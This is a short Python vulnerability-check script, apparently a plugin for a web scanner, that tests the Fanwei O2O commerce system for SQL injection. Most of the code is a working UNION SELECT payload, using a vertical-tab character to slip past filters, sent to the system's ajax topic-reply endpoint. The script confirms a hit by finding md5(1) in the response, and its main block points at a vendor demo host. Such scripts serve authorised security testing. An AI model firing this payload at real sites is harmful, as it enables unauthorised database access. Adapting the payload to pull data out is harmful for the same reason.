#!/usr/bin/evn python 
#--coding:utf-8--*--

#Author:wonderkun
#Name:方维o2o商业系统，sql注入
#Refer:http://wooyun.org/bugs/wooyun-2015-0122585
#Date:2015/09/6


def assign(service,arg):
    if service=="fangwei":
        return True,arg 

def audit(arg):
    url=arg+"index.php?ctl=ajax&act=load_topic_reply_list"
    data="topic_id=-1 union select%0b1,2,3,md5(1),5,6,7,8,9%23"
    code,head,res,errcode,finalurl=curl.curl2(url,post=data)
    if code==200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
            security_hole('find post sql injection: ' + arg+'index.php/?ctl=ajax&act=load_topic_reply_list')


if  __name__ == '__main__':
    from dummy import *
    audit(assign("fangwei","http://o2odemo.fanwe.net/")[1])